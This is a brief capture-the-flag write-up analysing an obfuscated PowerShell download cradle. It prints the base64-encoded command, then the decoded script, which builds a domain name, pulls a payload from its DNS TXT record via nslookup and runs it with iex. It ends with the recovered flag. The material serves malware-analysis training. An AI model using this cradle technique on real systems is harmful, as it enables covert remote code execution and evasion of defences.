# Cradle 2

## Description

Seeing as the last download cradle was busted so easily, McSkiddy threw quite a few more obfuscation techniques into this one. He's sure of his work now.

Can you drill through to find the core behavior of this downloader?

```ps1
poWeRShElL -nOp -EnC "JABhAD0AKAAxADIAMAAgACwANwAsACAAMwA3ACwAIAAxADEANwAsADEAOQAgACwAMQAxADQAIAAsACAAMgA1ACwAIAA1ADkALAAxADEANgAsACAANgAsADIANwApADsAJAByAD0AKAAoACAAWwBjAEgAQQBSAFsAXQBdACAAKAAkAGEAKQAgAHwARgBPAHIARQBBAGMAaAAgAHsAIABbAGMASABBAFIAXQAoACQAXwAtAGIAWABvAHIAIgAwAHgANAAxACIAIAApACAAfQAgACkAIAAtAEoATwBpAG4AJwAnACkAOwAkAHMAPQAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAoAFsAcgBlAGcAZQB4AF0AOgA6AE0AYQB0AGMAaABlAHMAKAAoACIAewAwAH0AewAxADIAfQB7ADQAfQB7ADEAMAB9AHsAMwB9AHsAMQB9AHsAOAB9AHsAMgB9AHsANwB9AHsANgB9AHsAMQAxAH0AewA1AH0AewA5AH0AIgAtAGYAIAAnAD0APQBRAGYAegAnACwAJAB7AHIAfQAsACcASABaAGgAOQBHACcALAAnAHkAJwAsACcAYwB2AE4AVwAnACwAJwBaADIAVgBHACcALAAnAGwAJwAsACcAYgA1AEYARwBjADcAUgAzAFkAJwAsACcAZgA1AFcAYQBmAE4AJwAsACcAYgAnACwAJwBaACcALAAnAFoAbQBaAGwAeABXACcALAAnAFIAbQAnACkALAAnAC4AJwAsACgAIgB7ADAAfQB7ADEAfQB7ADIAfQAiACAALQBmACcAUgBpAGcAaAB0AFQAJwAsACcAbwAnACwAJwBMAGUAZgB0ACcAKQApAHwARgBgAE8AcgBFAEEAYwBoACAAewAkAF8ALgB2AGEAbAB1AGUAfQApACAALQBqAG8AaQBuACAAJwAnACkAKQApADsAaQBgAGUAeAAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAKABOAFMAYABMAGAAbwBvAGsAVQBQACAALQBxAHUAZQByAHkAdAB5AHAAZQA9AHQAeAB0ACAAJABzACAAPgAkAG4AdQBsAGwAIAAyAD4AJgAxAHwAIABTAEUATABFAGMAVABgAC0AUwB0AGAAUgBpAGAATgBHACAALQBQAGEAdAB0AGUAcgBuACAAJwAiACoAIgAnACkAIAAtAHMAcABsAGkAdAAgACcAIgAnAFsAMABdACkAKQApACkA"
```

Again, we can decode the powershell using base64.

```powershell
$a=(120 ,7, 37, 117,19 ,114 , 25, 59,116, 6,27);$r=(( [cHAR[]] ($a) |FOrEAch { [cHAR]($_-bXor"0x41" ) } ) -JOin'');$s=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([regex]::Matches(("{0}{12}{4}{10}{3}{1}{8}{2}{7}{6}{11}{5}{9}"-f '==Qfz',${r},'HZh9G','y','cvNW','Z2VG','l','b5FGc7R3Y','f5WafN','b','Z','ZmZlxW','Rm'),'.',("{0}{1}{2}" -f'RightT','o','Left'))|F`OrEAch {$_.value}) -join '')));i`ex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((NS`L`ookUP -querytype=txt $s >$null 2>&1| SELEcT`-St`Ri`NG -Pattern '"*"') -split '"'[0]))))
```

I simply ran the result in powershell to have it spit out the flag.



```
leveleffect{payloads_in_dns_txt_records}
```




